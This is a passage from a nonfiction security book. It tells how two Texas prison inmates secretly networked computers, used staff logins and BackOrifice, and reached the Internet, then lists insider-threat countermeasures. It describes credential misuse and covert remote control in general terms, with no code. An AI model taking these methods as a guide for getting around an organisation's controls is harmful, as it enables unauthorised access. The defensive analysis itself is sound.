the drop of a hat or do whatever we had to do.
Danny was already serving a 20-year sentence at the Wynne Unit, a
prison in Huntsville, Texas, when William arrived. His initial prison job
had nothing to do with computers.
They first sent me to a unit where you start you doing field work
on the farms. You go hoeing up and down rows. They could use
machines for that, but they don’t — it’s a form of punishment so
you feel better about whatever job they give you later.
When Danny was transferred to the Wynne unit, he was grateful to be
assigned clerical work in the Transportation Office. “I started to work on
an Olivetti typewriter with a monitor and a couple of disk drives. It ran
DOS and had a little memory. I messed around trying to learn how to
use it.” (For me, that rang familiar bells: The first computer I ever used
was an Olivetti teletype with a 110-baud acoustic-coupler modem.)
He found an old computer book lying around, an instruction manual for
the early database program dBase III. “I figured out how to put the reports
on dBase, while everybody else was still typing theirs.” He converted the
office purchase orders to dBase and even started a program to track the
prison’s shipments of farm products to other prisons around the state.
Eventually Danny made trustee status, which brought a work assign-
ment involving a higher level of trust and what’s referred to as a “gate
pass,” allowing him to work outside the secure perimeter of the prison.
He was sent to a job in the dispatch office in a trailer outside the fence,
preparing shipping orders for the delivery trucks transporting the food
goods. But what really mattered was that it gave him “my first real access
to computers.” The Art of Intrusion 5007_569597 ch03.qxd  1/11/05  9:36 PM  Page 50

After a while, he was given a small room in the trailer and put in charge
of hardware — assembling new machines and fixing broken ones. Here
was a golden opportunity: learning how to build computers and fix them
from hands-on experience. Some of the people he worked with would
bring in computer books for him, which accelerated his learning curve. 
Being in charge of hardware gave him access to “a shelf full of com-
puter parts with nothing inventoried.” He soon grew reasonably skilled
at assembling machines or adding components. Prison staff didn’t even
inspect the systems to determine how he had configured them, so he
could easily set up machines with unauthorized equipment.
Federal Prisons Are Different
That kind of careless disregard for what a prisoner is up to is unlikely in a
federal prison. The U.S. Bureau of Prisons has a sensibly high level of para-
noia about the subject. During my time inside, I had a “NO COMPUTER”
assignment, which meant it was considered a security threat for me to
have any computer access. Or even access to a phone, for that matter: A
prosecutor once told a federal magistrate that if I was free to use a phone
while in custody, I would be able to whistle into it and send instructions
to an Air Force intercontinental missile. Absurd, but the judge had no
reason not to believe it. I was held in solitary for eight months.
In the federal system at that time, prisoners were allowed computer
access only under a strict set of guidelines. No inmate could use any
computer that was attached to a modem, or that had a network card or
other communication device. Operationally critical computers and sys-
tems containing sensitive information were clearly marked “Staff Use
Only” so it would be immediately apparent if an inmate was using a com-
puter that put security at risk. Computer hardware was strictly controlled
by technology knowledgeable staff to prevent unauthorized use. 
William Gets the Keys to the Castle
When William was transferred from the farm prison to the Wynne unit in
Huntsville, he landed an enviable job in the kitchen. “I had the keys to
the castle because I could trade food for other things.” 
The kitchen had one computer, an ancient 286 machine with a cooling
fan on the front but still good enough for him to make good progress with
developing his computer skills. He was able to put some of the kitchen
records, reports, and purchase order forms on the computer, which saved
hours of adding columns of numbers and typing out paperwork. 
After William discovered there was another prisoner who shared his
interest in computers, Danny was able to help improve the quality of theChapter 3 The Texas Prison Hack
 5107_569597 ch03.qxd  1/11/05  9:36 PM  Page 51

computer setup in the commissary. He pulled components off the shelf
in the Agriculture trailer and then recruited the aid of some friends with
maintenance assignments, who could go anywhere in the prison. 
They didn’t answer to anyone. So they sneaked computer parts into
the kitchen for us — just put them into a cart and roll it down. 
Then one Christmas Eve, a guard walked onto the unit with a
box that basically had parts for a whole computer in it, and a hub
and other stuff.
How did he convince a guard to break the rules so blatantly? “I just did
what they call ‘worked my jelly’ on him — I just talked to him and
befriended him.” William’s parents had purchased the computer items at
his request, and the guard agreed to bring in the load of items as if they
were Christmas presents.
To provide work space for his expanding computer installation, William
appropriated a small storage room attached to the commissary. The room
was unventilated but he was sure that wouldn’t be a problem, and it
wasn’t: “I traded food to get an air conditioner, we knocked a hole in the
wall and put the air conditioner unit in so we could breath and could
work in comfort,” he explained. 
“We built three PCs back there. We took old 286 cases and put
Pentium boards in them. The hard drives wouldn’t fit, so we had to use
toilet paper rolls for hard drive holders,” which, while an innovative solu-
tion, must have been funny to look at.
Why three computers? Danny would drop in sometimes, and they’d
each have a computer to use. And a third guy later started “a law
office” — charging inmates for researching their legal issues online and
drawing up papers for filing appeals and the like.
Meanwhile, William’s skills in using a computer to organize the com-
missary’s paperwork came to the attention of the captain in charge of
food service. He gave William an added assignment: When not busy with
regular duties, he was to work on setting up computer files for the cap-
tain’s reports to the warden. 
To carry out these additional responsibilities, William was allowed to
work in the captain’s office, a sweet assignment for a prisoner. But after a
time William began to chafe: Those computers in the commissary were by
now loaded with music files, games, and videos. In the captain’s office, he
had none of these pleasing diversions. Good old American innovation plus
a healthy dose of gutsy fearlessness suggested a way of solving the problem.
I traded food from the kitchen to get network cable from mainte-
nance. We had the maintenance clerk order us a 1,000-foot spoolThe Art of Intrusion 5207_569597 ch03.qxd  1/11/05  9:36 PM  Page 52

of Cat 5 [Ethernet] cable. We had the guards open up pipe chases
and ran the cable. I just told them I was doing work for the
Captain and they’d open the door.
In short order, he had hardwired an Ethernet connection linking up
the three computers he now had in the commissary, with the computer
in the captain’s office. When the captain wasn’t there, William had the
pleasure of playing his computer games, listening to his music, and
watching his videos. 
But he was running a big risk. What if the captain came back unex-
pectedly and discovered him with music playing and a game on the
screen, or a girlie movie? It would mean goodbye to the privileged posi-
tion in the kitchen, the cushy duties in the captain’s office, and the access
to the computer setup he had so painstakingly assembled.
Meanwhile, Danny had his own challenges. He was now working in the
Agriculture Office surrounded by computers, with telephone jacks
everywhere connecting to the outside world. He was like a kid with his
nose pressed to the window of the candy store and no money in his
pocket. All those temptations so nearby and no way to enjoy them. 
One day an officer showed up in Danny’s tiny office. “[He] brought his
machine in because he couldn’t get connected to the Internet. I didn’t
really know how a modem worked, there was nobody teaching me any-
thing. But I was able to help him set it up.” In the process of getting the
machine online, the officer, on request, gave Danny his username and
password; probably he didn’t see any problem about doing this, knowing
that inmates weren’t allowed to use any computer with online access. 
Danny realized what the guard was too dense or too technically illiterate
to figure out: He had given Danny an e-ticket to the Internet. Secretly
running a telephone line behind a rack of cabinets into his work area,
Danny hooked it up to the internal modem in his computer. With the
officer’s login and password that he had memorized, he was golden: He
had Internet access. 
Online in Safety
For Danny, achieving an Internet connection opened up a whole new
world on his monitor. But just as for William, he ran a huge risk every
time he went online.
I was able to dial out, pick up information about computers and
all, and ask questions. I was signing on for the officer but the
whole time I was afraid it might come to light. I tried to be care-
ful not to stay on so long that I tied up the lines.Chapter 3 The Texas Prison Hack
 5307_569597 ch03.qxd  1/11/05  9:36 PM  Page 53

A clever workaround suggested itself. Danny installed a “splitter” on
the phone line going to the fax machine. But it wasn’t long before the
Ag unit began to hear complaints from other prisons wanting to know
why their fax line was busy so much of the time. Danny realized he’d
have to get a dedicated line if he wanted to cruise the Net at leisure and
in safety. A little scouting provided the answer: He discovered two tele-
phone jacks that were live but not in use. Apparently none of the staff
remembered they even existed. He reconnected the wire from his
modem, plugging it into one of the jacks. Now he had his own outside
line. Another problem solved.
In a corner of his tiny room, under a pile of boxes, he set up a com-
puter as a server — in effect, an electronic storage device for all the great
stuff he planned to download, so the music files and computer hacking
instructions and all the rest wouldn’t be on his own computer, just in case
anybody looked. 
Things were shaping up, but Danny was plagued by one other diffi-
culty, a considerably bigger one. He had no way of knowing what would
happen if he and the officer tried to use the officer’s Internet account at
the same time. If Danny was already connected, would the officer get an
error message saying that he couldn’t get online because his account was
already in use? The man might have been a dense redneck, but surely at
that point he would remember giving Danny his sign-on information and
begin to wonder. At the time, Danny couldn’t think of a solution; the
problem gnawed at him.
Still, he was proud of what he’d accomplished given the circumstances.
It had taken an enormous amount of work. “I had built up a good foun-
dation — running servers, downloading anything I could get off the
web, running ‘GetRight’ [software] that would keep a download going
twenty-four hours. Games, videos, hacking information, learning how
networks are set up, vulnerabilities, how to find open ports.”
William understood how Danny’s setup in the Agriculture Department
had been possible. “He was basically the network administrator because
the free-world guy [the civilian employee] they had working there was a
buffoon.” The inmates were being assigned jobs that the employee was
supposed to be doing but didn’t know how, things like “the C++ and
Visual Basic programming,” nor did they have the smarts necessary to
properly administer the network. 
Another challenge also troubled Danny: His computer faced an aisle,
so anybody could see what he was doing. Since the Agriculture Office
was locked up after working hours, he could only go online during the
day, watching for moments when everyone else in the office seemed to
be too busy with their own work to take any interest in what he was up
to. Picking up a clever trick that would allow him to take control ofThe Art of Intrusion 5407_569597 ch03.qxd  1/11/05  9:36 PM  Page 54

another computer, he connected his machine to the one used by a civilian
employee who worked opposite him. When the man wasn’t there and it
looked like maybe no one would be drifting into the back room for a while,
Danny would commandeer the other computer, put it online, and set it to
download some game or music he wanted to the server in the corner.
One day when he was in the middle of getting online for a download,
somebody showed up unexpectedly in Danny’s work area: a female
guard — always much more hard-nosed and by-the-rules than the men,
Danny and William agree. Before he could release his control of the other
machine, the guard’s eyes widened: She had noticed the cursor moving!
Danny managed to quit his operation. The guard blinked, probably fig-
uring she must have imagined it, and walked out.
Solution
William still vividly remembers the day when the solution to both of their
Internet access problems occurred to Danny. The kitchen crew was allowed
to take their meals in the officer’s dining room after the officers had finished
and cleared out. William would often sneak Danny in to eat the “much bet-
ter food” in the dining room with him, and they could also talk privately
there. “I can still remember the day I got him up there,” William related.
“He said, ‘I know how we can do it, B.’ That’s what they called me — B,
or Big B. And with it he explained to me what we were gonna do.”
What Danny envisioned was putting together two pieces of a puzzle;
the telephone lines to the outside world, available to him in the
Agriculture Department, and William’s computers in the kitchen. He
proposed a way that would let the two of them use computers and get
onto the Internet whenever they wanted, in freedom and safety.
We always sat in the back of the commissary playing games on the
computers. And I thought, “If we could sit down here and play
games, and nobody cares — the guards don’t care as long as we
get our work done — then why can’t we access the Internet from
right here?”
The Agriculture Office had computer equipment that was more up-
to-date because, as Danny explained, other prisons around the state
“razzed” to their server. His term “razzed” was a way of saying that com-
puters at the other prisons were connecting by dial-up to the Agriculture
Office server, which was configured to allow dial-up connections through
Microsoft’s RAS (Remote Access Services).
A key make-or-break element confronted the guys: modems. “Getting
hold of modems was a major deal,” William said. “They kept those prettyChapter 3 The Texas Prison Hack
 5507_569597 ch03.qxd  1/11/05  9:36 PM  Page 55

tight. But we were able to get our hands on a couple.” When they were
ready to go online from the commissary, “What we would do was dial up
on the inner-unit phone lines and razz into the Agriculture Department.”
Translation: From the commissary, the guys would enter a command
instructing the computer modem to dial a phone call over an internal
phone line. That call would be received by a modem in the farm shop, a
modem connected to Danny’s server. That server was on a local network
to all the other computers in the office, some of which had modems con-
nected to external phone lines. With commissary and Ag Office com-
puter networks talking to each other over the internal phone line, the
next command would instruct one of those Ag Office computers to dial
out to the Internet. Voilà! Instant access.
Well, not quite. The two hackers still needed an account with an Internet
service provider. Initially, they used the login names and passwords of per-
sonnel who worked in the department, “when we knew they were gonna
be out of town hunting or something like that,” says Danny. This infor-
mation had been gleaned by installing on the other computers software
called “BackOrifice,” a popular remote monitoring tool that gave them
control of a remote computer as if they were sitting right in front of it.
Of course, using other people’s passwords was risky — with all sorts of
ways you might get caught. It was William this time who came up with a
solution. “I got my parents to pay for us to have Internet access with a
local service company,” so it was no longer necessary to use other peo-
ple’s sign-on information.
Eventually they kept the Internet connection through the Agriculture
Office going 24/7. “We had two FTP servers running down there down-
loading movies and music and more hacking tools and all kinds of stuff like
that,” says Danny. “I was getting games that hadn’t even been released yet.”
Nearly Caught
In their commissary headquarters, William hooked up sound cards and
external speakers so they could play music or hear the soundtrack as they
watched a downloaded movie. If a guard asked what they were doing,
William told them, “I don’t ask your business, don’t ask mine.”
I told [the guards] all the time there’s some things in life that I can
promise. Number one, I won’t have a pistol and I won’t shoot any-
body in here. Number two, I will not do drugs and dilute my mind.
Number three, I’m not gonna have a pimp and I’m not gonna be
a pimp. Number four, I won’t mess with a female officer. 
I couldn’t promise them that I wouldn’t fight. I never lied to ’em.
And they respected my honesty and my forthrightness, and so The Art of Intrusion 5607_569597 ch03.qxd  1/11/05  9:36 PM  Page 56

they’d do things for me. You can get guards to do favors by 
conversation.
Conversation rules the nation. You talk women out of their
panties, see what I’m saying, you talk men into doing what you
want them to do for you.
But no matter how clever a talker a prisoner may be, no guard is going
to allow an inmate free reign with computers and outside phone lines. So
how did these two get away with their hacker escapades in plain view of
the guards? William explained:
We were able to do a lot of the stuff we did because they looked at
us like half wits. We’re in the seat of redneck-dom, so the bosses
[guards] had no idea what we were doing. They couldn’t even
fathom what we were capable of.
Another reason would have to be that these two inmates were doing com-
puter work others had been paid to take care of. “Most of the people they
had there that were supposed to be in the know about things like comput-
ers,” says William, “they just weren’t capable, so they had inmates doing it.”
This book is full of stories of the chaos and damage hackers can cause,
but William and Danny were not bent on criminal mischief. They merely
wanted to enhance their growing computer skills and keep themselves
entertained — which under their circumstances is hardly difficult to under-
stand. It’s important to William that people appreciate the distinction.
We never did abuse it or hurt anybody. We never did. I mean from
my standpoint, I deemed it necessary to learn what I wanted to
learn so I could go straight and be successful once I was released.
While the Texas prison officials remained in the dark about what was
going on, they were fortunate that William and Danny had benign motives.
Imagine what havoc the two might have caused; it would have been child’s
play for these guys to develop a scheme for obtaining money or property
from unsuspecting victims. The Internet had become their university and
playground. Learning how to run scams against individuals or break in to
corporate sites would have been a cinch; teenagers and preteens learn these
methods every day from the hacker sites and elsewhere on the Web. And
as prisoners, Danny and William had all the time in the world. 
Maybe there’s a lesson here: Two convicted murderers, but that didn’t
mean they were scum, rotten to the core. They were cheaters who hacked
their way onto the Internet illegally, but that didn’t mean they were will-
ing to victimize innocent people or naively insecure companies. Chapter 3 The Texas Prison Hack
 5707_569597 ch03.qxd  1/11/05  9:36 PM  Page 57

Close Call
The two neophyte hackers didn’t let the pleasurable distraction of
Internet entertainment slow their learning, however. “I was able to get
the books that I wanted from my family,” says William, who felt his
escapades were a form of sorely needed hands-on training. “I wanted to
understand the intricate workings of a TCP/IP network. I needed that
kind of knowledge for when I got out.” 
It was an education but it was fun, too — you know what I’m
saying? It was fun because I’m an A-type personality — I like
living on the edge. And it was a way to snub our nose at “the
man.” Because they were clueless.
Besides the serious side and the fun side of their Internet use, Danny
and William also got a few kicks from socializing. They started electronic
friendships with some ladies, meeting them in online chat rooms and
communicating by e-mail. With a few, they acknowledged they were in
prison; with most, they neglected to mention the fact. No surprise there.
Living on the edge can be invigorating but always carries a dire risk.
William and Danny could never stop looking over their shoulders. 
“One time we got close to getting caught,” William remembered. “One
of the officers we didn’t like because he was real paranoid. We didn’t like
to be online while he was working.”
This particular guard called the commissary one day and found the line
continually busy. “What made him freak out was that one of the other
guys working in the kitchen had started a relationship with a nurse in the
prison clinic.” The guard suspected that the prisoner, George, was tying
up the line with an unauthorized call to his nurse fiancée. In reality, the
phone line was tied up because William was using the Internet. The
guard hurried to the commissary. “We could hear the key in the gate, so
we knew somebody was coming. We shut everything down.”
When the guard arrived, William was entering reports on the computer
as Danny innocently looked on. The guard demanded to know why the
phone line had been busy for so long. William was ready for him and
reeled off a story about needing to make a call to get information for the
report he was working on.
We couldn’t have gotten an outside line from back there, and he
knew it, but this guy was just super-paranoid. He thought that
somehow we had helped George call his fiancée.The Art of Intrusion 5807_569597 ch03.qxd  1/11/05  9:36 PM  Page 58

Whether he believed William’s story or not, without proof the guard
couldn’t do anything. George later married the nurse; as far as William
knows, he’s still in prison and still happily married.
Growing Up
How does a youngster like William — a kid from a stable home with car-
ing, supportive parents — land in prison? “My growing up was excellent,
man. I was a C student but very smart. Never played football and all that
stuff, but never got into any trouble until I went off to college.” 
Being raised Southern Baptist was not a positive experience for William.
Today, he feels that mainstream religion can harm a young person’s self-
esteem. “You know, teaching that you’re worthless from the get-go.” He
attributes his poor choices in part to the fact that he had become con-
vinced he couldn’t be successful. “You know, I had to gain my self-respect
and self-esteem from somewhere and I gained it from people fearing me.”
A student of philosophy, William understood what Friedrich Nietzsche
meant by a “metamorphosis of the spirit”:
I don’t know if you’ve ever read any Nietzsche, but he spoke of the
camel, the lion, and the child. And I was really a camel — I did
what I thought would make people happy to gain self-worth from
people liking me, rather than me liking myself and carrying
myself on my own merit.
Despite this, William made it through high school with an unblemished
record. His troubles started after he enrolled in a junior college in the
Houston area, then transferred to a school in Louisiana to study aviation.
The instinct to please others turned into a need for respect.
I saw that I could make money selling Ecstasy and stuff. People
feared me ’cause I was always armed and would always fight,
and you know, just live life like an idiot. And then got myself in
a situation of a drug deal gone bad. 
He and his customer ended up rolling around, struggling for control.
The other guy’s buddy showed up; it was two against one, and William
knew he had to do something desperate or he would never walk away
from there. He pulled out his gun and fired. And the man was dead. 
How does a boy from a strong, stable family face this hard reality? How
does he share the dreadful news?
One of the hardest things in my life to do was tell my mother that
I did it. Yeah, it was very hard.Chapter 3 The Texas Prison Hack
 5907_569597 ch03.qxd  1/11/05  9:36 PM  Page 59

William had a lot of time to think about what landed him in prison. He
doesn’t blame anyone but himself. “You know, it was just the choices I
made because my self-esteem was wrecked. And it wasn’t nothing that
my parents did because they brought me up the way that they thought
they should.”
For Danny, everything went wrong in a single night. 
I was just a stupid kid. The night of my eighteenth birthday, they
gave me a big party. On the way home, a couple of the girls
needed to use the restroom, so I pulled off at a restaurant. 
When they came out, they had a couple of guys following them
and harassing them. We piled out of the car and there was a big
fight, and before everything was over, I ran over one of them. 
And then I panicked and we drove off. I left the scene.
It was the Richard Nixon/Martha Stewart syndrome at work: not
being willing to step up and take responsibility for his action. If Dan
hadn’t driven off, the charge would most likely have been manslaughter.
Leaving the scene compounded the mistake, and once he was tracked
down and arrested, it was too late for anyone to believe it might have
been accidental.
Back in the Free World
William was a quarter of the way through a 30-year sentence, but he
wasn’t having any success on his annual visits before the parole board.
His talent for taking the initiative again came to the fore. He began writ-
ing letters to the parole board, one letter every two weeks, with copies
addressed individually to each of the three board members. The letters
detailed how constructive he was being: “What courses I was taking, the
grades I was getting, the computer books I was reading, and so on,”
showing them that “I’m not frivolous and I’m not wasting my time.” 
He says, “One of the members told my mom, ‘I got more mail from
him than my six kids combined.’” It worked: He kept it up for almost a
year and on his next appearance before the board, they signed him out.
Danny, on a shorter sentence, was released about the same time.
Since leaving prison, both William and Danny live fiercely determined
to stay out of trouble, working computer-related jobs with skills gained
during their years “inside.” While each took college-level tech courses in
prison, both believe their hands-on experience, perilous though it was,
gave them the advanced skills they now depend on for their living. The Art of Intrusion 6007_569597 ch03.qxd  1/11/05  9:36 PM  Page 60

Danny earned 64 college credit hours in prison, and though he fell
short of earning any professional certifications, now works with high-
powered, critical applications including Access and SAP.
Before prison, William completed his freshman year in college and was
a sophomore, with his parents supporting him. Once he got out, he was
able to continue his education. “I applied for financial aid and got it and
went to school. I got straight A’s and also worked in the school’s com-
puter center.”
He now has two associate’s degrees — in liberal arts and network com-
puter maintenance — both paid for by financial aid. Despite the two
degrees, William didn’t have quite the luck of Danny in landing a com-
puter job. So he took what he could find, accepting a position involving
physical labor. Credit his determination and his employer’s open-minded
attitude: As soon as the firm recognized his computer skills, he was pulled
off the physical tasks and set to work at a job that makes better use of his
technical qualifications. It’s routine business computing, not the network
designing he’d rather be doing, but he satisfies that urge by spending
time on weekends figuring out low-cost ways of networking the com-
puter systems for two Houston-area churches, as a volunteer.
These two men stand as exceptions. In one of the most pressing and
least-discussed challenges of contemporary American society, most felons
released from prison face a near-impossible hurdle of finding work, espe-
cially any job that pays enough to support a family That’s not hard to
understand: How many employers can be confident about the idea of hir-
ing a murderer, an armed robber, a rapist? In many states they are ineli-
gible for welfare, leaving few ways of supporting themselves while
continuing the near-hopeless search for work. Their options are severely
limited — and then we wonder why so many quickly return to prison,
and assume it must be that they lack the will to live by the rules.
Today, William has some solid advice for young people and their parents:
I don’t think there’s any one thing you can say to a youngster to
make them change, other than to have value in themselves, you
know, and never take the short road, ’cause the long road always
seems to be the most rewarding in the end. And you know, never
sit stagnant because you don’t feel you’re worthy enough to do
what you need to do. 
Danny would no doubt also agree with these words of William’s:
I wouldn’t trade my life now for nothin’ on earth. I’ve come to
believe that I can gain my way in life by my own merit and notChapter 3 The Texas Prison Hack
 6107_569597 ch03.qxd  1/11/05  9:36 PM  Page 61

take shortcuts. Over the years I learned that I could have people
respect me on my own merit. That’s what I try to live by today.
INSIGHT
This story makes clear that many computer attacks can’t be protected
against just by securing the perimeter. When the villain isn’t some teen
hacker or computer-skilled thief but an insider — a disgruntled
employee, a bitter former worker recently fired, or, as in this case, some
other type of insiders like William and Danny. 
Insiders often pose a greater threat than the attackers we read about in
the newspapers. While the majority of security controls are focused on
protecting the perimeter against the outside attacker, it’s the insider who
has access to physical and electronic equipment, cabling, telephone clos-
ets, workstations, and network jacks. They also know who in the organi-
zation handles sensitive information and what computer systems the
information is stored on, as well as how to bypass any checks put in place
to reduce theft and fraud. 
Another aspect of their story reminds me of the movie Shawshank
Redemption . In it, a prisoner named Andy is a CPA. Some of the guards
have him prepare their tax returns and he gives them advice on the best
ways of structuring their finances to limit their tax liability. Andy’s abili-
ties become widely known among the prison staff; leading to more book-
keeping work at higher levels in the prison, until eventually he’s able to
expose the Warden, who has been “cooking” the books. Not just in a
prison but everywhere, we all need to be careful and discreet about
whom we give sensitive information to.
In my own case, the United States Marshal Service created a high level
of paranoia about my capabilities. They placed a warning in my file cau-
tioning prison officials not to disclose any personal information to me —
not even giving me their names, since they believed a wild rumor that I
could tap into the government’s plethora of secret databases and erase
the identity of anyone, even a Federal Marshal. I think they had watched
“The Net” one too many times.
COUNTERMEASURES
Among the most significant security controls that can be effective in pre-
venting and detecting insider abuse are these:
Accountability. Two common practices raise accountability issues: the
use of so-called role-based accounts — accounts shared by multiple
users; and the practice of sharing account information or passwordsThe Art of Intrusion 6207_569597 ch03.qxd  1/11/05  9:36 PM  Page 62

to permit access when an employee is out of the office or unavail-
able. Both create an environment of plausible deniability when
things go seriously wrong. 
Very simply, sharing account information should be discouraged if
not altogether prohibited. This includes allowing one worker to
use his/her workstation when this requires providing sign-on 
information. 
Target-rich environment. In most businesses, an attacker who can
find a way of getting into the work areas of the facility can easily
find a way to gain access to systems. Few workers lock their com-
puters when leaving their work area or use screensaver or start-up
passwords. It only takes seconds for a malicious person to install
stealth monitoring software on an unprotected workstation. In a
bank, tellers always lock their cash drawer before walking away.
Unfortunately, it’s rare to see this practice being used at other
types of institutions. 
Consider implementing a policy that requires the use of a screen-
saver password or other program to electronically lock the
machine. Ensure that the IT department enforces this policy
through configuration management. 
Password management. My girlfriend was recently employed by a
Fortune 50 company that uses a predictable pattern in assigning
passwords for outside web-based intranet access: the user’s name 
followed by a random three-digit number. This password is set
when the person is hired and cannot ever be changed by the
employee. This makes it possible for any employee to write a
simple script that can determine the password in no more than
1,000 tries — a matter of a few seconds.
Employee passwords, whether set by the company or selected by
the employees, must not have a pattern that makes them easily 
predictable.
Physical access. Knowledgeable employees familiar with the com-
pany’s network can easily use their physical access to compromise
systems when no one is around. At one point I was an employee
of GTE of California, the telecommunications company. Having
physical access to the building was like having the keys to the 
kingdom — everything was wide open. Anyone could walk up to
a workstation in an employee’s cubicle or office and gain access
to sensitive systems. 
If employees would properly secure their desktops, workstations, 
laptops, and PDA devices, by using secure BIOS passwords and
logging out, or locking their computer, the bad guy on the inside
will need more time to accomplish his objectives.Chapter 3 The Texas Prison Hack
 6307_569597 ch03.qxd  1/11/05  9:36 PM  Page 63

Train employees to feel comfortable challenging people whose
identity is uncertain, especially in sensitive areas. Use physical secu-
rity controls like cameras and/or badge access systems to control
entry, surveillance, and movement within the facility. Consider
periodically auditing physical entry and exit logs to identify unusual
patterns of behavior, especially when a security incident arises.
“Dead” cubicles and other access points. When an employee
leaves the company or is transferred to a different position, leaving
a cubicle empty, a malicious insider can connect via the live net-
work jacks in the cubicle to probe the network while protecting
his/her identity. Or worse, a workstation often remains behind in
the cubicle, plugged into the network ready for anyone to use,
including the malicious insider (and, as well, any unauthorized 
visitor who discovers the abandoned cubicle).
Other access points in places like conference rooms also offer easy
access to the insider bent on doing damage.
Consider disabling all unused network jacks to prevent anonymous
or unauthorized access. Ensure that any computer systems in
vacant cubicles are secured against unauthorized access.
Exiting personnel. Any worker who has given notice of termination
should be considered a potential risk. Such employees should be
monitored for any access to confidential business information,
especially copying or downloading a significant amount of data.
With tiny USB flash drives now readily available that can hold a
gigabyte or more of data, it can be a matter of minutes to load
up large amounts of sensitive information and walk out the door
with it.  
It should be routine practice to put restrictions on an employee’s
access prior to his/her being notified of a termination, demotion,
or undesirable transfer. Also, consider monitoring the employee’s
computer usage to determine any unauthorized or potentially
harmful activities.
Installation of unauthorized hardware. The malicious insider can 
easily access another employee’s cubicle and install a hardware or 
software keystroke logger to capture passwords and other confiden-
tial information. Again, a flash drive makes stealing data easy. A
security policy that prohibits any introduction of hardware devices
without written permission, while justified in some circumstances,
is admittedly difficult to police; benign employees will be inconve-
nienced, while the malicious have no incentive for paying attention
to the rule.The Art of Intrusion 6407_569597 ch03.qxd  1/11/05  9:36 PM  Page 64

In certain organizations that work with extremely sensitive infor-
mation, removing or disabling the USB port on workstations may
be a necessary control.
Walk-around inspections should be conducted regularly. In particular,
these inspections should verify that the machines have not had unau-
thorized wireless devices, hardware keystroke loggers, or modems
attached, and that no software has been installed except as authorized.  
Security or IT personnel can check for unauthorized wireless access
points in the immediate vicinity by using a PDA that supports
802.11, or even a laptop equipped with Microsoft XP and a wire-
less card. Microsoft XP has a built in zero-configuration utility that
pops up a dialogue box when it detects a wireless access point in
the immediate vicinity.
Circumventing processes. As employees learn about critical business
processes within the organization, they’re in a good position to
identify any weaknesses with the checks and balances used to detect
fraud or theft. A dishonest worker is in a position to steal or cause
other significant harm based on their knowledge of how the business
operates. Insiders usually have unfettered access to offices, file cabi-
nets, internal mailing systems, and have knowledge of the day-to-
day business procedures.
Consider analyzing sensitive and critical business processes to iden-
tify any weaknesses so countermeasures can be implemented. In
certain situations, developing separation of duties requirement in
the process, where a sensitive operation performed by one person is
checked independently by another, can reduce the security risk.
On-site visitor policies. Establish a security policy for outside visi-
tors, including workers from other office locations. An effective
security control is to require visitors to present State-issued 
identification prior to being allowed into the facility, and recording
the information in a security log. If a security incident should arise,
it may be possible to identify the perpetrator.
Software inventory and auditing. Maintain an inventory of all
authorized software installed or licensed for each system and peri-
odically audit these systems for compliance. This inventory process
not only ensures legal compliance with software licensing regulations,
but also may be used to identify any unauthorized software installa-
tions that could negatively affect security. 
Unauthorized installation of malicious software like keystroke log-
gers, adware, or others type of spyware are hard to detect, depend-
ing on how clever the developers were at hiding the program
within the operating system. Chapter 3 The Texas Prison Hack
 6507_569597 ch03.qxd  1/11/05  9:36 PM  Page 65

Consider using third-party commercial software to identify these
malicious types of programs, such as the following:
●Spycop (available at www.spycop.com)
●PestPatrol (available at www.pestpatrol.com)
●Adware (available from www.lavasoftusa.com)
Audit systems for software integrity. Employees or malicious insid-
ers could replace critical operating system files or applications that
could be used by bypass security controls. In this story, the inmate
hackers had changed the PC Anywhere application to run without
displaying an icon in the system tray so they would not be detected.
The prison officials in this story never realized that their every move
was periodically being monitored while Danny and William virtually
looked over their shoulders.
In some circumstances, it may be appropriate to conduct an
integrity audit, and to use a third-party application that notifies the
appropriate staff when any changes are made to system files and
applications on the “watch list.”
Excessive privileges. In Windows-based environments, many end-
users are logged into accounts with local administrator rights on
their own machines. This practice, while more convenient, makes it
very easy for a disgruntled insider to install a keystroke logger or
networking monitoring (sniffer) on any systems where he has local
administrator privileges. Remote attackers also may send malicious
programs hidden within an email attachment that may be opened
by the unsuspecting user. The threat posed by these attachments
can be minimized by using the “least privilege” rule, which means
that users and programs should run with the fewest privileges nec-
essary to perform their required tasks.  
THEBOTTOM LINE
In some situations, common sense dictates that elaborate security pre-
cautions are a waste of time. In a military school, for example, you would
not expect the student body to be filled with people looking for every
possible opportunity to cheat or challenge the rules. In an elementary
school, you would not expect ten-year-olds to be more knowledgeable
about computer security than the staff technology guru. 
And in a prison, you would not expect that inmates, closely watched,
living under a set of rigid rules, would find the means not just to work
their way onto the Internet but then to spend hours at a time, day afterThe Art of Intrusion 6607_569597 ch03.qxd  1/11/05  9:36 PM  Page 66

day, enjoying music, movies, communications with the opposite sex, and
learning more and more about computers.
The moral: If you are in charge of information security for any school,
workgroup, company, or other entity — you have to assume that some
malicious adversary, including someone inside your organization — is
looking for that small crack in the wall, the weakest link of your security
chain to break your network. Don’t assume that everyone is going to play
by the rules. Do what is cost-effective to prevent potential intrusions, but
don’t forget to keep looking out for what you missed. The bad guys are
counting on you to be careless.Chapter 3 The Texas Prison Hack

Chapter 4
Cops and Robbers
I walked into this classroom full of law enforcement officers and said, “Do
you guys recognize any of these names?” I read off a list of the names. One
federal officer explained, “Those are judges in the U.S. District Court in
Seattle.” And I said, “Well, I have a password file here with 26 passwords
cracked.” Those federal officers about turned green.
— Don Boelling, Boeing Aircraft
Matt and Costa weren’t planning an attack on Boeing Aircraft;
it just turned out that way. But the outcome of that incident
and others in their chain of hacker activities stand as a warn-
ing. The two could be the poster boys in a campaign to warn other kid
hackers too young to appreciate the consequences of their actions.
Costa (pronounced “COAST-uh”) Katsaniotis started learning about
computers when he got a Commodore Vic 20 at age 11 and began pro-
gramming to improve the machine’s performance. At that tender age, he
also wrote a piece of software that allowed his friend to dial up and see a
list of the contents of his hard drive. “That’s where I really started with
computers and loving the what-makes-things-work aspect of having a
computer.” And not just programming: He probed the hardware,
unworried, he said, about losing the screws “because I started out taking
things apart when I was three.” 
His mother sent him to a Christian private school until eighth grade and
then to a public school. At that age his tastes in music leaned toward U2
(it was his first album and he’s still a big fan), as well as Def Leppard and
“some of the darker music”; meanwhile his tastes in computing were
expanding to include “getting into what I could do with phone num bers.”08_569597 ch04.qxd  1/11/05  9:22 PM  Page 69

A couple of older kids had learned about 800-WATS extenders, phone
numbers they could use to make free long-distance calls.
Costa loved computers and had a natural understanding of them.
Perhaps the absence of a father heightened the teen’s interest in a world
where he enjoyed complete control.
Then in high school I kinda took a break and I figured out what
girls were. But I still always had my passion for computers and
